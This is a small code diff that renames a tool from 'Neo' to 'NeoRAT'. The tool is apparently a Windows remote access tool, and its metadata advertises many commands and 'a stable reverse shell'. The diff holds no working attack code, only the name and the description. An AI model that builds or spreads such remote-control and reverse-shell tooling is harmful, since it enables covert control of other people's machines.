@@ -2,7 +2,7 @@ from binary.encrypt_data import *
 
 
 state = {
-  'name': 'Neo',
+  'name': 'NeoRAT',
   'description': 'A Windows remote access tool application supporting\n'
                 + 'a whide range of powerful & easy to use commands\n'
                 + 'along with a stable reverse shell. [USE: \'HELP\']',
